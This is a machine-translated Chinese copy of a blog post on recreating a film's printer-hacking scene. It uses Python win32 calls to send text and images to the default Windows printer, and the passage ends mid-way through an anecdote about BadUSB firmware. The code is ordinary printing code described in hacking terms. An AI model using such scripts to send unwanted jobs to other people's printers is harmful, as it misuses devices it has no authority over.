<html>
<head>
<title>How I recreated an iconic hacking scene exploiting several printers</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何利用几台打印机重现了一个标志性的黑客场景</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/how-i-recreated-an-iconic-hacking-scene-exploiting-several-printers-729ae331c47e?source=collection_archive---------5-----------------------#2019-06-21">https://medium.com/hackernoon/how-i-recreated-an-iconic-hacking-scene-exploiting-several-printers-729ae331c47e?source=collection_archive---------5-----------------------#2019-06-21</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><div class=""><h2 id="380d" class="pw-subtitle-paragraph ir ht hu bd b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji ek translated">来自电影《我是谁——没有一个系统是安全的》</h2></div><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff jj"><img src="../Images/a5a6abb1223b4f2e421aa838cd31d498.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*zHfitJYNhJmLwsXF.gif"/></div></figure><h1 id="6cdf" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">背景</h1><p id="9c34" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">我不知道其他的<em class="lf">黑客</em>，但我是总<strong class="kl hv"> <em class="lf"> n00b </em> </strong>说到<br/> <em class="lf">“一定要</em> <strong class="kl hv"> <em class="lf"> </em> </strong> <em class="lf">看黑客电影/连续剧”</em></p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff lg"><img src="../Images/8d619658c1ce99617297b37e50885135.png" data-original-src="https://miro.medium.com/v2/resize:fit:998/format:webp/1*nqiSflxVE0CDDEklhk7PPg.png"/></div></figure><p id="5867" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">是啊。我知道。闭嘴。</p><h1 id="befe" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">(预)情节</h1><p id="80cf" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">当我进入大学，我的一个朋友强迫我在第二天看<br/> <strong class="kl hv"> <em class="lf">【社交网络】</em> </strong> <em class="lf">，坦白地说，我很喜欢！我不知道它对我产生了怎样的影响，但我肯定它给我的军火库增加了一个很酷的GIF。<em class="lf">(你很快就会看到)</em></em></p><p id="c383" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">此后，我很少见到。<em class="lf">(忘不了机器人先生，为第四季而死)<br/> </em>最近看到“<strong class="kl hv">我是谁——没有系统是安全的</strong>”</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff lm"><img src="../Images/288d84432be5392524ca33308035aad4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qWrvdDp2g5Bt625u.png"/></div></div></figure><p id="0ce3" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><em class="lf">(字幕救了我的命，看了原版(俄语)又名没有配音)</em></p><blockquote class="lr"><p id="e6d2" class="ls lt hu bd lu lv lw lx ly lz ma le ek translated">本杰明——一个孤独的计算机专家——遇到了魅力非凡的马克斯，他们两人——以及马克斯的朋友们——组成了克雷，一个颠覆性的黑客组织。</p></blockquote><h1 id="960b" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja mb jb kd jd mc je kf jg md jh kh ki dt translated">真正的情节</h1><p id="4e8d" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">我喜欢这部电影，就像我看过的每部电影或每本书一样，是时候将电影中的一些东西运用到现实世界中去，增强我的知识、经验或..<em class="lf">介于</em>之间的任何东西。我用我看到或读到的一切来做这件事，我会试着分享所有这些故事。<strong class="kl hv">很快</strong>。<br/> <strong class="kl hv"> <em class="lf">好了，继续前进。</em> </strong> <em class="lf">(出自《社交网络》的一句台词)</em></p><p id="61a3" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">我觉得下面的部分很吸引人。</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff me"><img src="../Images/8ef675c55ac3862087adc61e3f42a8b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/1*mKnT4z51QGeXZ0RjSYefgQ.gif"/></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">The Fun, printers going crazy</figcaption></figure><p id="7caf" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">这一切是怎么发生的？</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff mj"><img src="../Images/d8068485c39b8fef09430a503a5993ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5DzpyWp6fTP_I1kIL_6V9A.png"/></div></div></figure><p id="a24b" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">我们开始吧..</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff me"><img src="../Images/94f6f6a72b7ee6e7965879bfd62c9e7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/1*NPEXwMWAQhhfzgQ5zGHOKg.gif"/></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">The iconic “hacking” scene we all crave for</figcaption></figure><p id="5801" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">因为我觉得这很有趣，我开始了我的搜索。我开始阅读关于打印机、它们如何通信、哪些协议用于信息交换、过去关于利用打印机的研究论文等等。</p><h1 id="d82d" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">无聊的侦察角落</h1><p id="4a48" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">我们的打印机使用的一些语言/协议:</p><ul class=""><li id="92dc" class="mk ml hu kl b km lh kp li ks mm kw mn la mo le mp mq mr ms dt translated">简单网络管理协议(Simple Network Management Protocol)</li><li id="f20d" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">PML/PJL</li><li id="8d45" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">附笔</li><li id="91d4" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">规定</li><li id="f2ad" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">LPD</li><li id="489f" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">IPP</li><li id="1a9c" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">生的</li><li id="af01" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">服务器信息块</li></ul><p id="37e8" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">我发现了很多有趣的东西，我用砖砌了我的家用打印机，打开了所有的部件，撕开了电路，玩得很开心，我将分享我的发现。</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff my"><img src="../Images/84e38ab420c98632840b6c59b5cb7f27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JVTlsDeuVTjh836DBmVzEQ.jpeg"/></div></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">Late Mr. Home Printer</figcaption></figure><p id="4881" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">但是，现在，让我们专注于标题，即在我们的现实世界中重新创建上述场景。正如你所猜测的，有许多打印机，有许多语言，所以，可以有戏剧，<em class="lf">很多戏剧。</em></p><p id="058f" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">而作为你的<strong class="kl hv"> <em class="lf"> 1337 HaX0r </em> </strong>，你的<em class="lf">【剥削三明治】</em>应该可以。<em class="lf">句号。</em></p><h1 id="f3e3" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">解决方案？</h1><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff mz"><img src="../Images/46b90ba131ba3e5b8ea7707b05e20fe9.png" data-original-src="https://miro.medium.com/v2/resize:fit:836/format:webp/0*pfF5K3cjHD19EVya.png"/></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">Market Share of various major Operating Systems</figcaption></figure><p id="1992" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><strong class="kl hv">宾果。</strong> <em class="lf">(电影中本杰明最喜欢的词)</em></p><h1 id="20a9" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">拯救我们的窗户</h1><p id="1ef9" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">因为它占了大部分份额，所以让我们把手弄脏来滥用windows吧。<br/>我们可以想象底层架构，打印机通过自己的首选语言<em class="lf"> (PJL、PML、PostScript …) </em>与计算机对话/连接，然后计算机对其进行处理、推断。</p><p id="8378" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">但是，当我们点击<strong class="kl hv">打印</strong>按钮，打印<em class="lf">我们的撅嘴自拍</em>时，你知道症结中的<em class="lf">会发生什么吗？</em></p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff na"><img src="../Images/ac19e93a7699dfc16a6c4190586083b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YWCr3GlP2L7WlqKtVRu4mA.png"/></div></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">My drawing, I know, I am a born artist.</figcaption></figure><p id="c8e0" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">那么，与其攻击<strong class="kl hv">(打印机→电脑)</strong>界面，为什么不深入研究一下<strong class="kl hv">(应用程序→电脑)</strong>界面呢？</p><h1 id="5094" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">攻击API</h1><p id="8221" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><em class="lf">或者只是低级接口？</em></p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff me"><img src="../Images/a64a679842e5ea308204966b983ce754.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/0*JbR-WyyxPMiMCvzL.gif"/></div></figure><p id="20d5" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">与其写一堆原生C++，为什么不<em class="lf">也抽象</em>这一层呢？<br/>让我们使用一个包含大多数低层<strong class="kl hv"> <em class="lf"> win32 </em> </strong>协议的python包装器。</p><p id="c2a8" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">在长时间摆弄<strong class="kl hv"> <em class="lf"> win32api </em> </strong>之后，我抓耳挠腮了好几次，学习了许多关于win32协议、包装器、COM对象、<br/>的东西，我也开始了解另一个模块，名为<strong class="kl hv"> win32print </strong>。<br/>经过大量的挖掘，我终于创造出了<em class="lf">这颗宝石，皇冠上的宝石，<br/> l33t c0d3！</em></p><pre class="jk jl jm jn fq nb nc nd ne aw nf dt"><span id="5e0c" class="ng js hu nc b fv nh ni l nj nk">win32api.ShellExecute (<br/> 0,<br/> “printto”,<br/> open (tempfile.mktemp (“.txt”), “a”).write (“Inject this!”),<br/> ‘“%s”’ % win32print.GetDefaultPrinter (),<br/> “.”,<br/> 0<br/> )</span></pre><blockquote class="lr"><p id="78d7" class="ls lt hu bd lu lv nl nm nn no np le ek translated">这是我的埃菲尔铁塔。这是我的拉赫玛尼诺夫的第三首。我的圣母玛丽亚。它非常优雅，非常漂亮，能够让任何连接到windows系统的打印机发疯。我称之为“前妻”</p></blockquote><p id="40e6" class="pw-post-body-paragraph kj kk hu kl b km nq iv ko kp nr iy kr ks ns ku kv kw nt ky kz la nu lc ld le hn dt translated"><em class="lf">(引用自</em> <strong class="kl hv"> <em class="lf">钢铁侠2 </em> </strong> <em class="lf">，感谢贾斯汀·哈默)</em></p><h1 id="bbd1" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">代码拆卸</h1><p id="05e3" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">我们可以把代码分解成三大部分:<br/>-<strong class="kl hv"><em class="lf">shell execute</em></strong>函数(对指定文件执行操作)<br/>-<strong class="kl hv"><em class="lf">print to</em><em class="lf">(</em></strong><a class="ae nv" href="https://docs.microsoft.com/en-us/windows/desktop/shell/launch#object-verbs" rel="noopener ugc nofollow" target="_blank"><em class="lf">对象动词</em></a><em class="lf">)<br/>-</em><strong class="kl hv"><em class="lf">win 32 print</em></strong><em class="lf">API和<em class="lf"/></em></p><h2 id="8e28" class="ng js hu bd jt nw nx ny jx nz oa ob kb ks oc od kd kw oe of kf la og oh kh oi dt translated"><strong class="ak"> <em class="oj">外壳执行</em> </strong>功能</h2><p id="fee4" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><strong class="kl hv"> ShellExecute </strong>是<em class="lf">代码</em>相当于用户“双击”一个文件图标。它使Windows计算出文档文件与什么应用程序相关联，启动程序并让它加载文档文件。</p><p id="43a7" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">通过使用<strong class="kl hv"> ShellExecute </strong>，你不需要知道注册到特定文件类型的程序的名称或位置。Windows会帮你解决这个问题。比如你可以<strong class="kl hv"> ShellExecute </strong>一个<strong class="kl hv">。PDF] </strong>文件，只要安装了<em class="lf">阅读器、Acrobat </em>或其他一些PDF阅读应用，Windows就会启动它并为你加载<strong class="kl hv"> PDF </strong>。</p><h2 id="af85" class="ng js hu bd jt nw nx ny jx nz oa ob kb ks oc od kd kw oe of kf la og oh kh oi dt translated">宾语动词</h2><p id="41a8" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">快捷菜单上的每个命令在注册表中由其动词<em class="lf">标识。这些动词与<a class="ae nv" href="https://msdn.microsoft.com/en-us/library/bb762154(v=vs.85)" rel="noopener ugc nofollow" target="_blank"><strong class="kl hv">ShellExecuteEx</strong></a>以编程方式启动应用程序时使用的动词相同。<em class="lf">(快速参考— </em> <a class="ae nv" href="https://msdn.microsoft.com/en-us/library/bb776886(v=vs.85)" rel="noopener ugc nofollow" target="_blank"> <em class="lf">启动应用</em> </a> <em class="lf">)。)</em></em></p><p id="9025" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">动词是一个简单的文本字符串，Shell使用它来标识相关的命令。每个动词对应于用于在控制台窗口中启动命令的<em class="lf">命令字符串</em>。</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff ok"><img src="../Images/7515baa2d45647d88a29dceff6f21e07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CpVrd93zf5jm1QjvZ6H0YA.png"/></div></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">List of verbs</figcaption></figure><p id="a582" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">等一下！实际交易在哪里？列表中没有“printto”动词！</p><blockquote class="lr"><p id="c782" class="ls lt hu bd lu lv lw lx ly lz ma le ek translated">printto谓词也是规范的，但从不显示。它允许用户通过拖动文件到打印机对象来打印文件。</p></blockquote><h2 id="00e5" class="ng js hu bd jt nw ol ny jx nz om ob kb ks on od kd kw oo of kf la op oh kh oi dt translated">“printto”宾语动词</h2><p id="4bd7" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated">在微软Windows 95及更高版本的系统上右击一个对象通常会弹出一个<em class="lf">快捷菜单</em>。该菜单包含一个命令列表，用户可以选择这些命令来对对象执行各种操作。本节介绍文件系统对象的快捷菜单。</p><ul class=""><li id="e8ce" class="mk ml hu kl b km lh kp li ks mm kw mn la mo le mp mq mr ms dt translated">文件系统对象的快捷菜单</li><li id="26c8" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">快捷菜单动词</li><li id="16f3" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">扩展文件类的快捷菜单</li><li id="feb2" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">扩展预定义壳对象的快捷菜单</li><li id="691c" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">注册应用程序以处理任意文件类</li><li id="137b" class="mk ml hu kl b km mt kp mu ks mv kw mw la mx le mp mq mr ms dt translated">扩展新的子菜单</li></ul><p id="4fab" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><strong class="kl hv">Kudos:——</strong>Mat Baker&amp;Michael "<em class="lf">micolous</em>"都帮助我们<strong class="kl hv"> <em class="lf">参见</em></strong><strong class="kl hv">under-documented</strong><a class="ae nv" href="http://msdn.microsoft.com/en-us/library/aa969321.aspx#class" rel="noopener ugc nofollow" target="_blank"><strong class="kl hv">printto</strong></a><strong class="kl hv">动词</strong>，它以打印机名称作为参数，如果它包含空格，就用引号括起来。</p><div class="oq or fm fo os ot"><a href="https://docs.microsoft.com/en-us/previous-versions//bb776820%28v=vs.85%29#class" rel="noopener  ugc nofollow" target="_blank"><div class="ou ab ej"><div class="ov ab ow cl cj ox"><h2 class="bd hv fv z el oy eo ep oz er et ht dt translated">扩展快捷菜单</h2><div class="pa l"><h3 class="bd b fv z el oy eo ep oz er et ek translated">因为快捷菜单经常用于文件管理，所以Shell提供了一组默认命令，例如Cut…</h3></div><div class="pb l"><p class="bd b gc z el oy eo ep oz er et ek translated">docs.microsoft.com</p></div></div><div class="pc l"><div class="pd l pe pf pg pc ph jp ot"/></div></div></a></div><h2 id="9287" class="ng js hu bd jt nw nx ny jx nz oa ob kb ks oc od kd kw oe of kf la og oh kh oi dt translated"><strong class="ak"><em class="oj">win32 print</em></strong><em class="oj">API</em></h2><p id="c65d" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><strong class="kl hv"> <em class="lf"> Q-1。</em> </strong> <em class="lf">我们为什么需要这个？</em> <br/> <em class="lf">回答:——</em>我们需要一个API，它可以让我们在底层访问打印机。<br/> <strong class="kl hv"> <em class="lf"> Q-2。</em> </strong> <em class="lf">我们需要什么？</em> <br/> <em class="lf">答案:——</em>蒂姆·戈尔登的<strong class="kl hv"> win32print </strong>模块看起来很完美！</p><p id="5c3b" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">在阅读了代码和文档后，我搜索并阅读了各种部件/功能。</p><div class="oq or fm fo os ot"><a href="http://timgolden.me.uk/pywin32-docs/win32print.html" rel="noopener  ugc nofollow" target="_blank"><div class="ou ab ej"><div class="ov ab ow cl cj ox"><h2 class="bd hv fv z el oy eo ep oz er et ht dt translated">模块win32print</h2><div class="pa l"><h3 class="bd b fv z el oy eo ep oz er et ek translated">封装Windows打印API的模块。请访问win32 print _ _ GetDefaultPrinter _ meth . html</h3></div><div class="pb l"><p class="bd b gc z el oy eo ep oz er et ek translated">timgolden.me.uk</p></div></div></div></a></div><h1 id="fd8d" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">准备好大改造吧，伙计们！</h1><p id="795b" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><em class="lf">(另一个来自钢铁侠2) </em></p><p id="8661" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">打印文本很酷，但是如果我想要同上的场景，<strong class="kl hv"> <em class="lf">同上</em> </strong>文档呢？</p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="fe ff pi"><img src="../Images/39dc3f9f222f31c77dd0f3e40e7b072c.png" data-original-src="https://miro.medium.com/v2/resize:fit:400/format:webp/0*EeDCbw-VSoLThjwr.png"/></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">Everybody wants a Ditto! (in Pokemon, obviously, yeah, even Ash Ketchum, see EP037)</figcaption></figure><h1 id="ae04" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">打印文档</h1><p id="5978" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><strong class="kl hv"> <em class="lf"> win32print </em> </strong>模块提供了(几乎)所有的打印原语，你需要这些原语来获取一些数据，并将其发送到已经在你的系统中定义好的打印机上。数据必须是打印机乐于接受的形式，通常是文本<em class="lf">(我们以前用过)</em>或原始<strong class="kl hv"> PCL </strong>之类的东西。</p><h1 id="31a2" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">让黑客攻击开始吧</h1><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div class="ab fr cl pj"><img src="../Images/557f06ea6a7d68f1cb79ea2d1d2194f6.png" data-original-src="https://miro.medium.com/v2/1*cihPkdjv-7l7RqZdgI_BvA.gif"/></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">The weapon I was talking about ;)</figcaption></figure><h1 id="d2a5" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">打印文档</h1><pre class="jk jl jm jn fq nb nc nd ne aw nf dt"><span id="8495" class="ng js hu nc b fv nh ni l nj nk">import win32ui<br/>import win32print<br/>import win32con</span><span id="dd5a" class="ng js hu nc b fv pk ni l nj nk">hDC = win32ui.CreateDC ()<br/>hDC.CreatePrinterDC (win32print.GetDefaultPrinter ())<br/>hDC.StartDoc (“Injected Doc”)<br/>hDC.StartPage ()<br/>hDC.SetMapMode (win32con.MM_TWIPS)<br/>hDC.DrawText (“HELLO WORLD”, (0, 1440 * -1, 1440 * 8, 1440 * -2), win32con.DT_CENTER)<br/>hDC.EndPage ()<br/>hDC.EndDoc ()</span></pre><h1 id="332e" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">打印图像</h1><pre class="jk jl jm jn fq nb nc nd ne aw nf dt"><span id="c9bb" class="ng js hu nc b fv nh ni l nj nk">import win32print<br/>import win32ui<br/>from PIL import Image, ImageWin</span><span id="38d4" class="ng js hu nc b fv pk ni l nj nk">hDC = win32ui.CreateDC ()<br/>hDC.CreatePrinterDC (win32print.GetDefaultPrinter ())<br/>bmp = Image.open ("<strong class="nc hv">whoami</strong>.jpg")<br/>hDC.StartDoc ("<strong class="nc hv">whoami?</strong>")<br/>hDC.StartPage ()<br/>dib = ImageWin.Dib (bmp)<br/>dib.draw (hDC.GetHandleOutput (), (0,0,(hDC.GetDeviceCaps (110), hDC.GetDeviceCaps (111))[0],(hDC.GetDeviceCaps (110), hDC.GetDeviceCaps (111))[1]))<br/>hDC.EndPage ()<br/>hDC.EndDoc ()<br/>hDC.DeleteDC ()</span></pre><h1 id="80ea" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">演示时间！</h1><p id="184d" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><strong class="kl hv">注:</strong>我在一台没有连接打印机的独立笔记本电脑上做了所有测试。因此，相反，它转向“保存PDF”的方法，这就是为什么运行有效载荷提示保存生成的数据，而不是直接打印它。</p><figure class="jk jl jm jn fq jo"><div class="bz el l di"><div class="pl pm l"/></div></figure><p id="90be" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">不相信那些？太好了！你自己去写剧本吧，不要打印就好，或者也许只打印一个<em class="lf">(也不要</em><a class="ae nv" href="https://thehackernews.com/2018/11/pewdiepie-printer-hack.html" rel="noopener ugc nofollow" target="_blank"><em class="lf">Pewdiepie</em></a><em class="lf">发烧，拜托)。</em>节约纸张。<strong class="kl hv">❤</strong></p><h1 id="cdda" class="jr js hu bd jt ju jv jw jx jy jz ka kb ja kc jb kd jd ke je kf jg kg jh kh ki dt translated">比好莱坞电影场景还要酷！</h1><blockquote class="lr"><p id="6be0" class="ls lt hu bd lu lv lw lx ly lz ma le ek translated">不接触任何键盘或思考任何“编程”的想法来做所有这些事情怎么样？</p></blockquote><h2 id="e5c3" class="ng js hu bd jt nw ol ny jx nz om ob kb ks on od kd kw oo of kf la op oh kh oi dt translated">浪子回头了！</h2><p id="d4b9" class="pw-post-body-paragraph kj kk hu kl b km kn iv ko kp kq iy kr ks kt ku kv kw kx ky kz la lb lc ld le hn dt translated"><em class="lf">(这个出自钢铁侠3) </em></p><p id="da05" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">是时候介绍我们的坏小子了，BadUSB！<em class="lf">(或者也许是橡皮鸭？)</em></p><p id="8de4" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><em class="lf">其实以上都不是，也不是原来的</em><strong class="kl hv"><em class="lf">bad USB</em></strong><em class="lf">利用了</em> <strong class="kl hv"> <em class="lf">群联2251–03(2303)</em></strong><em class="lf">芯片组的漏洞，用定制的固件给它打补丁，使它成为一台可编程的杀人机器，就像</em> <strong class="kl hv"> <em class="lf"> USB </em> </strong>一样</p><p id="38b2" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated">等一下，让我搜索一下我所谓的' <strong class="kl hv"> <em class="lf">实验室</em> </strong> <em class="lf">'因为我在家(暑假)……我找到了！</em></p><p id="3429" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><em class="lf">是的，我看了同一年的</em> <a class="ae nv" href="https://youtu.be/nuruzFqMgIw" rel="noopener ugc nofollow" target="_blank"> <em class="lf">那个</em> </a> <em class="lf">黑帽子视频</em><strong class="kl hv"><em class="lf">(2014)</em></strong><em class="lf">，疯狂了，因为Hak5不发货到印度(仍然，今天检查)而且它更酷(从技术上讲)，打破了我周围的每一个钢笔驱动器，最后发现一个，(也许两个)有相同的芯片组。</em></p><h2 id="abdf" class="ng js hu bd jt nw nx ny jx nz oa ob kb ks oc od kd kw oe of kf la og oh kh oi dt translated">这里有一个类似的芯片组，<strong class="ak">拆焊</strong></h2><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff pn"><img src="../Images/efaf8cbe1ad533f627796d872f847b9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6AZcINxsriUhDD4qZyStHg.png"/></div></div><figcaption class="mf mg fg fe ff mh mi bd b be z ek">Ah, memories ❤</figcaption></figure><p id="4571" class="pw-post-body-paragraph kj kk hu kl b km lh iv ko kp li iy kr ks lj ku kv kw lk ky kz la ll lc ld le hn dt translated"><strong class="kl hv">你以前是怎么连接这个的？</strong> <em class="lf">(以防万一..)</em></p><figure class="jk jl jm jn fq jo fe ff paragraph-image"><div role="button" tabindex="0" class="ln lo di lp bf lq"><div class="fe ff my"><img src="../Images/0d090ade7ea287b6d4bf8109fa89fc75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NQ8T5BQgFPkrGua446JpGA.png"/></div></div><figcaption class="mf mg fg fe ff mh mi bd b be z 